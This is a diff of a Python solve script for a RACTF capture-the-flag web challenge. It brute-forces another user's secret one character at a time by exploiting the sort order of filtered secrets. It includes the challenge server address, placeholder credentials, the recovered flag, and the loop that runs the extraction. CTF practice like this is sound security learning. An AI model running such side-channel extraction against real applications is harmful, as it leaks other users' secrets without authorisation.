@@ -3,23 +3,21 @@ import json
 import math
 
 # ractf{a-zA-Z0-9_-}
-CHARSET = '-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz}*'
-# FLAG_PREFIX = 'ractf{'
-FLAG_PREFIX = 'ractf{data_exf1l_via_s0rt1ng_0c66de4'
-# FLAG_PREFIX = 'ractf{data_exf1l_via_s0rt1ng'
+CHARSET = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz}'
+FLAG_PREFIX = 'ractf{'
 FLAG_SEC_ID = 1
 
-username = 'nep2'
-password = 'neptunian20'
+username = 'neptunian'
+password = 'myrealbankaccountpasswordwithmillions'
 
-username1 = 'nep1'
-password1 = 'neptunian20'
+username1 = 'neptunian1'
+password1 = 'myrealbankaccountpasswordwithmillions'
 
-username2 = 'nep2'
-password2 = 'neptunian20'
+username2 = 'neptunian2'
+password2 = 'myrealbankaccountpasswordwithmillions'
 
-# host = 'http://localhost:8000'
-host = 'http://193.57.159.27:21627'
+host = 'http://localhost:8000'
+# host = 'http://193.57.159.27:21627' # CTF Real Server
 
 ### Get create logged session
 def get_session(username, password):
@@ -130,7 +128,7 @@ def brute_next_char(session, current):
     )
 
 def bruteFlag(session, prefix):
-    current = FLAG_PREFIX
+    current = prefix
     ch_found = '{'
 
     while (ch_found != '}'):
@@ -142,42 +140,28 @@ def bruteFlag(session, prefix):
 
 if __name__ == '__main__':
 
-    # Setup
-    # s1 = get_session('admin2', 's0mePassword')
-    # sec1 = send_secret(s1, "ractf{s0me_fl4g}")
-    # print(sec1)
-    # for user in ['user1', 'user2', 'user3']:
-    #     su = get_session(user, 'pwdpwd12')
-    #     secu = send_secret(su, "someSecret")
-    #     print(secu)
-
-    # Neptunian secret
+    ## Neptunian secret
     # s1 = get_session('neptunian', 'pwdpwd12')
     # sec1 = send_secret(s1, "Not that secret")
     # print(sec1)
 
-    # All Secrets
+    ## All Secrets
     # s1 = get_session(username, password)
     # all_secs = get_all_secrets(s1)
     # print(json.dumps(all_secs, indent=2))
 
-    # Validate ordering
-    s1 = get_session(username1, password1)
-    secQ = send_secret(s1, "q")
-    s2 = get_session(username2, password2)
-    secS = send_secret(s2, "s")
-
-    print("ID 'Q': ", secQ['id'])
-    print("ID 'S': ", secS['id'])
-
-    all_secs = get_filtered_secrets(s1, [1, secQ['id'], secS['id']])
-    print('Ordered IDs:')
-    print(json.dumps(all_secs, indent=2))
-
-    # # Sample Flag
+    ## Validate the ordering hipothesis
     # s1 = get_session(username1, password1)
-    # sec1 = send_secret(s1, "ractf{data_exf1l_via_s0rt1ng_0c66de47}") # before 'r'(actf{)
-    # print(sec1)
+    # secQ = send_secret(s1, "q")
+    # s2 = get_session(username2, password2)
+    # secS = send_secret(s2, "s")
 
-    # brute_session = get_session(username, password)
-    # bruteFlag(brute_session, FLAG_PREFIX)
+    # print("ID 'Q': ", secQ['id'])
+    # print("ID 'S': ", secS['id'])
+
+    # all_secs = get_filtered_secrets(s1, [1, secQ['id'], secS['id']])
+    # print('Ordered IDs:')
+    # print(json.dumps(all_secs, indent=2))
+
+    brute_session = get_session(username, password)
+    bruteFlag(brute_session, FLAG_PREFIX)
